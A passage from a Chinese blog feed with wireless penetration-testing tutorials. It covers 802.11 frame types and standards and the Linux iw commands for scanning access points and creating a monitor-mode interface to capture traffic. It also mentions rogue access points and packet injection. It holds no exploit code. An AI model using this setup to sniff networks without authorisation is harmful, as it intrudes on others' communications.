src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230103110513105.png" alt="image-20230103110513105"></p><h2 id="MANAGEMENT-FRAME-管理帧"><a href="#MANAGEMENT-FRAME-管理帧" class="headerlink" title="MANAGEMENT FRAME(管理帧)"></a>MANAGEMENT FRAME(管理帧)</h2><blockquote><p><strong>用于控制和协商STA和AP的关系</strong></p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220410194219272-654899335.png" alt="img"></p><h3 id="BEACON-FRAMES"><a href="#BEACON-FRAMES" class="headerlink" title="BEACON FRAMES"></a>BEACON FRAMES</h3><blockquote><ul><li><p>AP发送的广播帧，通告无线网络的存在(BSSID)</p></li><li><p>发包频率</p><ul><li>102.4ms(可变)</li><li>时间单位1024 microseconds (60秒)，可自己设置</li></ul></li><li><p>SSID网络名</p><ul><li>隐藏AP不发SSID广播（路由可设置不广播，使用时可手动输入网络名和密码进行连接）</li></ul></li></ul></blockquote><h4 id="Beacon帧结构"><a href="#Beacon帧结构" class="headerlink" title="Beacon帧结构"></a>Beacon帧结构</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220410194741686-1789370470.png" alt="img"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104101034842.png" alt="image-20230104101034842"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104102249710.png" alt="image-20230104102249710"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104102904543.png" alt="image-20230104102904543"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104103203353.png" alt="image-20230104103203353"></p><h3 id="PROBE-FRAMES"><a href="#PROBE-FRAMES" class="headerlink" title="PROBE FRAMES"></a>PROBE FRAMES</h3><p><strong>PROBE REQUEST FRAMES</strong></p><blockquote><ul><li>用于STA主动发出扫描现有AP<ul><li>发现连接过的AP</li><li>发现未连连接的AP</li></ul></li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220410210056649-844319384.png" alt="img"></p><p><strong>注意</strong>：数据字段长度可变</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104105000502.png" alt="image-20230104105000502"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104105041964.png" alt="image-20230104105041964"></p><p><strong>PROBE RESPONSE FRAMES</strong></p><blockquote><p>发现连接过的AP时，速率和ESSID相同的AP响应</p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411090921372-550320158.png" alt="img"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104105201007.png" alt="image-20230104105201007"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104105215655.png" alt="image-20230104105215655"></p><h3 id="AUTHENTICATION-FRAMES"><a href="#AUTHENTICATION-FRAMES" class="headerlink" title="AUTHENTICATION FRAMES"></a>AUTHENTICATION FRAMES</h3><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411090946733-118600943.png" alt="img"></p><blockquote><p><strong>Authentication Algorithm身份认证类型</strong></p><ul><li>0:开放系统身份验证</li><li>1:共享密钥身份验证</li></ul><p>身份认证有多个帧交换过程组成</p><p><strong>Authentication Seq</strong></p><ul><li>每次身份验证过程Seq唯一</li><li>1-65535</li></ul><p>Challenge text</p><ul><li>只有共享密钥方式才有此字段</li></ul><p><strong>Status Code：成功&#x2F;失败</strong></p></blockquote><h3 id="ASSOCIATION-x2F-REASSOCIATION-FRAMES"><a href="#ASSOCIATION-x2F-REASSOCIATION-FRAMES" class="headerlink" title="ASSOCIATION&#x2F;REASSOCIATION FRAMES"></a>ASSOCIATION&#x2F;REASSOCIATION FRAMES</h3><blockquote><ul><li>身份验证成功后，STA执行关联操作，加入无线网络<ul><li>Association Request</li><li>Reassociation Request</li><li>Association Response</li></ul></li></ul></blockquote><h4 id="ASSOCIATION-REQUEST-FRAMES"><a href="#ASSOCIATION-REQUEST-FRAMES" class="headerlink" title="ASSOCIATION REQUEST FRAMES"></a>ASSOCIATION REQUEST FRAMES</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411091402411-336650571.png" alt="img"></p><h4 id="REASSOCIATION-REQUEST-FRAME"><a href="#REASSOCIATION-REQUEST-FRAME" class="headerlink" title="REASSOCIATION REQUEST FRAME"></a>REASSOCIATION REQUEST FRAME</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411091526026-501606248.png" alt="img"></p><h4 id="ASSOCIATION-RESPONSE"><a href="#ASSOCIATION-RESPONSE" class="headerlink" title="ASSOCIATION RESPONSE"></a>ASSOCIATION RESPONSE</h4><blockquote><p>AP对STA的关联请求的响应</p><p>状态码:关联成功&#x2F;失败</p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411091609054-1722093294.png" alt="img"></p><h4 id="DISASSOCIATION-x2F-DEAUTHENTICATION"><a href="#DISASSOCIATION-x2F-DEAUTHENTICATION" class="headerlink" title="DISASSOCIATION&#x2F;DEAUTHENTICATION"></a>DISASSOCIATION&#x2F;DEAUTHENTICATION</h4><blockquote><ul><li>解除关联&#x2F;解除身份认证</li><li>由AP发出<ul><li>2个字节</li></ul></li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411091710340-1945389500.png" alt="img"></p><p>可能的原因（部分）：</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411091731886-476254154.png" alt="img"></p><h3 id="ATIM-FRAMES"><a href="#ATIM-FRAMES" class="headerlink" title="ATIM FRAMES"></a>ATIM FRAMES</h3><blockquote><p>只在ad-hoc网络下使用，充当AP功能的STA使用此帧通知接收者其有缓存的数据要发送</p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220411091823515-33464501.png" alt="img"></p><p>有些帧没有抓到，可以看下面这篇帖子</p><p><a href="https://blog.csdn.net/random_run/article/details/115223124">https://blog.csdn.net/random_run/article/details/115223124</a></p><h2 id="DATA-FRAME"><a href="#DATA-FRAME" class="headerlink" title="DATA FRAME"></a>DATA FRAME</h2><p><strong>数据帧</strong></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220416150554294-685265653.png" alt="img"></p><h4 id="DATA-FRAMES"><a href="#DATA-FRAMES" class="headerlink" title="DATA FRAMES"></a>DATA FRAMES</h4><blockquote><ul><li>传输用户数据<ul><li>DATA Frame</li></ul></li><li>空数据帧<ul><li>Null data frame</li><li>只包含MAC头和FCS</li><li>STA用于声明自己将要进入省电模式</li></ul></li></ul></blockquote><p><strong>DATA Frame</strong></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220416171716500-645063485.png" alt="img"></p><p><strong>空数据帧</strong></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230104113025426.png" alt="image-20230104113025426"></p>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-Linux无线协议栈及配置命令</title>
      <link href="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="802-11协议栈"><a href="#802-11协议栈" class="headerlink" title="802.11协议栈"></a>802.11协议栈</h2><blockquote><ul><li>协议栈<ul><li>内核接口（kernel）</li><li>用户空间命令及相应的调用程序（userspace）</li></ul></li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/2379545-20220320171034128-1071200619.png" alt="img"></p><h2 id="无线网卡配置"><a href="#无线网卡配置" class="headerlink" title="无线网卡配置"></a>无线网卡配置</h2><h4 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a>查看无线网卡</h4><blockquote><ul><li>ifconfig</li><li>iwconfig</li><li>iw list</li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102174336039.png" alt="image-20230102174336039"></p><blockquote><p>其中Mode模式为Managed，只有Monitor模式才能抓包</p></blockquote><p>iw list命令：列出网卡支持的加密方法，接口模式，信道，功率以及命令等</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102174815671.png" alt="image-20230102174815671"></p><blockquote><p>其中支持的接口模式中必须要有<code>monitor和AP</code>两种接口，monitor作为抓包接口，AP作为eval AP用来作为流氓AP</p></blockquote><h4 id="查看信道频率"><a href="#查看信道频率" class="headerlink" title="查看信道频率"></a>查看信道频率</h4><blockquote><ul><li>iwlist wlan0 frequency</li><li>iw list</li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102175224598.png" alt="image-20230102175224598"></p><h4 id="扫描AP"><a href="#扫描AP" class="headerlink" title="扫描AP"></a>扫描AP</h4><blockquote><ul><li>iw dev wlan0 scan</li><li>iw dev wlan0 scan | grep SSID</li><li>iw dev wlan0 scan | egrep “DS Parameter set|SSID”</li><li>iwlist wlan0 scanning | egrep “ESSID|Channel”</li></ul></blockquote><ul><li>iw dev wlan0 scan</li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102175630291.png" alt="image-20230102175630291"></p><ul><li><p>iw dev wlan0 scan | egrep “DS Parameter set|SSID”</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102181733335.png" alt="image-20230102181733335"></p></li></ul><blockquote><ul><li>每一个BSS就是一个无线AP，后面会跟着相应的mac地址，以及此AP的各种详细信息；</li><li>beacon interval每100毫秒发送一个beacon，1秒发送10个beacon；</li><li>signal表示信号强度，负值表示接收信号强度</li><li>channel 6表示使用信道6</li><li>Authentication suites: PSK表示身份验证方式是PSK（预设的共享密钥）；知道共享密钥就可以连接AP</li></ul></blockquote><h4 id="添加删除侦听端口"><a href="#添加删除侦听端口" class="headerlink" title="添加删除侦听端口"></a>添加删除侦听端口</h4><blockquote><ul><li>iw dev wlan0 interface add wlan0mon type monitor（注意命名限制：wlan+数字+mon）</li><li>tcpdump -S 0 -i wlan0mon -P(建议用wireshark抓包查看)</li><li>iw dev wlan0mon interface del</li></ul></blockquote><h5 id="添加无线接口"><a href="#添加无线接口" class="headerlink" title="添加无线接口"></a>添加无线接口</h5><ul><li><p>iw dev wlan0 interface add wlan0mon type monitor</p><blockquote><p>add后面是新添加的接口名称wlan0mon；类型type是monitor</p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102182017303.png" alt="image-20230102182017303"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102182450593.png" alt="image-20230102182450593"></p><blockquote><p>此时已经成功添加一个新的无线网卡，类型为Monitor</p><p>使用<code>ifconfig wlan0mon up</code>是使其活跃起来</p><p><strong>注意：</strong>如果” iw dev wlan0 interface add wlan0mon type monitor “命令执行完 wlan0mon 是 Managed 模式或” ifconfig wlan0mon up”报错（参见下图），则可能是 network-manager 对 iw 命令相冲突，可通过先执行” service network-manager stop”命令，再进行如上操作解决。</p></blockquote></li></ul><h4 id="使用wireshark抓包"><a href="#使用wireshark抓包" class="headerlink" title="使用wireshark抓包"></a>使用wireshark抓包</h4><p>此时就能抓到无线数据包了</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102182953516.png" alt="image-20230102182953516"></p><p>802.11的包头结构</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102183031770.png" alt="image-20230102183031770"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102183132573.png" alt="image-20230102183132573"></p><h5 id="删除无线接口"><a href="#删除无线接口" class="headerlink" title="删除无线接口"></a>删除无线接口</h5><ul><li><p>iw dev wlan0mon interface del</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/image-20230102183314990.png" alt="image-20230102183314990"></p><blockquote><p>此时已经删除了wlan0mon无线网卡</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-无线渗透基础</title>
      <link href="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="IEEE"><a href="#IEEE" class="headerlink" title="IEEE"></a>IEEE</h2><blockquote><p>电气与电子工程师协会（Institute of Electrical and Electronics Engineers），简称IEEE，总部位于美国纽约，是一个国际性的电子技术与信息科学工程师的协会，也是全球最大的非营利性专业技术学会。</p><p>IEEE致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空、计算机、电信、生物医学、电力及消费性电子产品等领域已制定了1300多个行业标准，现已发展成为具有较大影响力的国际学术组织。</p><p>IEEE下的802委员会负责lan（局域网），man（城域网）标准的制定。</p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220319151149806-2032877631.png" alt="img"></p><h2 id="802-11标准"><a href="#802-11标准" class="headerlink" title="802.11标准"></a>802.11标准</h2><blockquote><p>IEEE 802.11是现今无线局域网通用的标准，它是由国际电机电子工程学会(IEEE)所定义的无线网络通信的标准。</p><p>其中定义了媒体访问控制层(MAC层)和物理层。物理层定义了工作在2.4GHz的ISM频段上的两种扩频作调制方式和一种红外传输的方式，总数据传输速率设计为2Mbit&#x2F;s。两个设备可以自行构建临时网络，也可以在基站(Base Station, BS)或者接入点(Access Point，AP)的协调下通信。为了在不同的通讯环境下取得良好的通讯质量，采用CSMA&#x2F;CA(Carrier Sense Multiple Access／Collision Avoidance)硬件沟通方式。</p><p><strong>注意：</strong>Wi-Fi标准是基于802.11 b的；无线是工作在数据链路层和物理层</p></blockquote><h4 id="802-11协议簇"><a href="#802-11协议簇" class="headerlink" title="802.11协议簇"></a>802.11协议簇</h4><blockquote><ul><li>802委员会下第11组负责开发无线局域网标准</li><li>IEEE 802.1 1 The Original WLAN Standard- 1 Mbit&#x2F;s and 2 Mbit&#x2F;w,2.4GHz RF andIR</li><li>IEEE 802.11 a 54 Mbit&#x2F;s,5 GHz</li><li>IEEE 802.11 b 802.11 Enhancements to Support 5.5 Mbit&#x2F;s and 11 Mbit&#x2F;s</li><li>IEEE 802.11 c Bridge Operation Procedure</li><li>IEEE 802.11 d International (Country to Country) Roaming Extensions</li><li>IEEE 802.11 e Quality of Service (Qos),Including Packet Bursting</li><li>IEEE 802.11 F Inter -Access Point Protocol</li><li>IEEE 802.11 g 54 Mbit&#x2F;s,2.4 GHz</li><li>IEEE 802.11 h Spectrum Managed 802.11 a (5 GHz) for European Compatibility</li><li>IEEE 802.11 i Enhanced Security</li><li>IEEE 802.11 j Extensions for Japan</li><li>IEEE 802.11 k Radio Resource Measurement Enhancements</li><li>IEEE 802.11 n Higher Throughput Using Multiple Input,Multiple Ouput(MIMO) Antennas</li><li>IEEE 802.11 p Wireless Access for the Vehicular Environment (WAVE)</li><li>IEEE 802.11 r Fast BSS Transition (FT)</li><li>IEEE 802.11 s Mesh Networking,Extended Service Set (ESS)</li><li>IEEE 802.11 T Wireless Performance Prediction (WPP)</li><li>IEEE 802.11 u Internetworking with Non -802 Networks (i.e.:Cellular)</li><li>IEEE 802.11 v wrieless Network Management</li><li>IEEE 802.11 v wrieless Network Management</li><li>IEEE 802.11 w Protected Management Frames</li><li>IEEE 802.11 y 3650 - 3700 MHz Operation in the US</li><li>IEEE 802.11 z Direct Link Setup (DLS) Extensions</li><li>IEEE 802.11 zm Maintenance of the Standard</li><li>IEEE 802.11 aa Robust Streatming of Audio Video Transport Streams</li><li>IEEE 802.11 ac Very High Troughput &lt; 6 GHz</li><li>IEEE 802.11 ad Very High Troughput, 60 GHz</li><li>IEEE 802.11 ae Qos Management</li><li>IEEE 802.11 af TV Whitespace</li><li>IEEE 802.11 ah SUb 1 GHz</li><li>IEEE 802.11 ai Fast Initial Link Setip</li></ul><p><strong>其中大写字母都是正式标准</strong></p></blockquote><h4 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h4><blockquote><ul><li>IEEE 802.11 - The original WLAN standard</li><li>IEEE 802.11 a - UP to 54 Mbit&#x2F;s on 5 GHz</li><li>IEEE 802.11 b - 5.5 Mbit&#x2F;s and 11 Mbit&#x2F;s? on 2.4 GHz</li><li>IEEE 802.11 g - Up to 54 Mbit&#x2F;s on 2.4 GHz.Backward compatible with 802.11b</li><li>IEEE 802.11 i - Provides enhanced security</li><li>IEEE 802.11 n - Provides higher throughput with Multiple Input&#x2F;Multiple Output (MIMO)</li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220319152831383-514252146.png" alt="img"></p><h4 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a>802.11</h4><blockquote><p><strong>发布于1997年</strong></p><p><strong>速率1Mbps或2Mbps</strong></p><p><strong>红外线传输介质（未实现）</strong></p><p><strong>无线射频信号编码（调制）（radio frequencies）</strong></p><ul><li><strong>-Direct-Sequence Spread-Spectrum (DSSS)—–直序扩频</strong></li><li><strong>-Frequency Hopping Spread-Spectrum (FHSS)—–跳频扩频</strong></li></ul><p><strong>媒体访问方式—–CSMA&#x2F;CA c&#x3D;b+log2 (1+s&#x2F;n) (载波侦听多路访问冲突避免)</strong></p><ul><li>-根据算法侦听一定时长</li><li>-发送数据前发包声明</li></ul><p><strong>Request to Send&#x2F;Clear to Send (RTS&#x2F;CTS)</strong></p></blockquote><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a>802.11b</h4><blockquote><p><strong>Complementary Code Keying (CCK)—–补充代码键</strong></p><ul><li><strong>5.5 and 11 Mbit&#x2F;s</strong></li><li><strong>2.4GHz band (2.4GHz - 2.485GHz)</strong></li><li><strong>14个重叠的信道channels</strong></li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220319154925085-698633778.png" alt="img"></p><blockquote><ul><li><strong>每个信道22MHz宽带</strong></li><li><strong>只有三个完全不重叠的信道</strong></li></ul><p><strong>美国 -1 to 11 (2.412 GHz - 2.462 GHz)</strong></p><p><strong>欧洲 -1 to 13 (2.412 GHz - 2.472 GHz)</strong></p><p><strong>日本 -1 to 14 (2.412 GHz - 2.482 GHz)</strong></p><p><strong>注意：相邻两个无线设备的信道不要重叠，以免造成影响</strong></p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220319154724564-1909481604.png" alt="img"></p><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a>802.11a</h4><blockquote><p><strong>与802.11b几乎同时发布</strong></p><ul><li><strong>-因设备价格问题一直没有得到广泛使用?</strong></li></ul><p><strong>使用5GHz宽带</strong></p><ul><li><strong>-2.4GHz宽带干扰源多（微波、蓝牙、无绳电话）</strong></li><li><strong>-5HGz频率有更多宽带空间，可容纳更多不重叠的信道</strong></li><li><strong>-Orthogonal Frequency-Division Multiplexing (OFDM)信号调制方法</strong><ul><li><strong>-正交频分复用技</strong></li></ul></li><li><strong>更高速率54Mbps，每个信道20MHz宽带</strong></li><li><strong>变频</strong><ul><li><strong>-5.15-5.35GHz室内</strong></li><li><strong>-5.7-5.8GHz室外</strong></li></ul></li></ul></blockquote><h4 id="802-11g"><a href="#802-11g" class="headerlink" title="802.11g"></a>802.11g</h4><blockquote><p><strong>2.4GHz</strong></p><p><strong>Orthogonal Frequency-Division Multiplexing (OFDM)信号调制方法?</strong></p><p><strong>与802.11a速率相同</strong></p><p><strong>可全局降速，向后兼容802.11b,并切换为CCK信号调制方法</strong></p><p><strong>每个信号20&#x2F;22MHz宽带</strong></p></blockquote><h4 id="802-11n"><a href="#802-11n" class="headerlink" title="802.11n"></a>802.11n</h4><blockquote><p><strong>2.4或5 GHz频率</strong></p><ul><li><strong>300Mbps最高600Mbps</strong></li><li><strong>Multiple-Input Multiple-Output (MIMO)多进多出通信技术</strong></li><li><strong>多天线，多无线电波，独立收发信号</strong></li><li><strong>可以使用40MHz信道带宽是数据传输速率翻倍</strong></li></ul><p><strong>全802.11n设备网络中，可以使用新报文格式，是速率达到最大</strong></p><p><strong>每个信道20&#x2F;40MHz宽带</strong></p></blockquote><h2 id="无线网络运行模式"><a href="#无线网络运行模式" class="headerlink" title="无线网络运行模式"></a>无线网络运行模式</h2><blockquote><ul><li>无线网络架构<ul><li>Infrastructure（基础架构型）<ul><li>AP 维护SSID(无线网名称)</li></ul></li><li>Ad-Hoc（无AP型）<ul><li>STA维护SSID</li></ul></li></ul></li><li>Service Set Identifier (SSID，服务集标识符)<ul><li>AP每秒钟约10次通过Beacon帧广播SSID</li><li>客户端连接到无线网络后也会宣告SSID</li></ul></li></ul></blockquote><h4 id="Infrastructure（基础架构无线网络）"><a href="#Infrastructure（基础架构无线网络）" class="headerlink" title="Infrastructure（基础架构无线网络）"></a>Infrastructure（基础架构无线网络）</h4><blockquote><ul><li>至少包含一个 AP 和 一个 STATION（终端），形成一个 Basic Service Set (BSS)，BSSID指对应 AP 的 MAC。</li><li>AP 连接到有线网络，称为 Distribution System (DS，分布式系统)。</li><li>连接到同一个 DS 的多个 AP 形成 Extended Service Set (ESS，扩展服务集)，ESSID相当于交换机的MAC。</li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220319171447767-1277412205.png" alt="img"></p><h4 id="AD-HOC"><a href="#AD-HOC" class="headerlink" title="AD-HOC"></a>AD-HOC</h4><blockquote><p>也被称为Independent Basic Service Set (IBSS)</p><p>有至少2个STAs直接通信组成</p><p>也称为peer to peer模式</p><p>其中一个STA（终端）负责AP的工作</p><ul><li>通过beacon广播SSID</li><li>对其他STAs进行身份验证</li></ul></blockquote><h4 id="WIRELESS-DISTRIBUTION-SYSTEM-WDS"><a href="#WIRELESS-DISTRIBUTION-SYSTEM-WDS" class="headerlink" title="WIRELESS DISTRIBUTION SYSTEM (WDS)"></a>WIRELESS DISTRIBUTION SYSTEM (WDS)</h4><blockquote><p>与有线DS类似，只是通过无线连接的多个AP组成的网络</p><ul><li>Bridging——只有AP间彼此通信</li><li>Repeating—–允许所有AP和STA（终端）进行通信</li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220319172222854-613894260.png" alt="img"></p><h4 id="MONITOR-MODR模式"><a href="#MONITOR-MODR模式" class="headerlink" title="MONITOR MODR模式"></a>MONITOR MODR模式</h4><blockquote><p><strong>Monitor不是一种真的无线模式</strong></p><ul><li>但是对无线渗透至关重要</li><li>允许无线网卡没有任何筛选的抓包(802.11包头)</li><li>与有线网络的混杂模式可以类比</li><li>合适的网卡和驱动不但可以monitor，更可以injection</li></ul></blockquote><h2 id="无线网硬件设备及基本概念"><a href="#无线网硬件设备及基本概念" class="headerlink" title="无线网硬件设备及基本概念"></a>无线网硬件设备及基本概念</h2><h4 id="无线网卡准备"><a href="#无线网卡准备" class="headerlink" 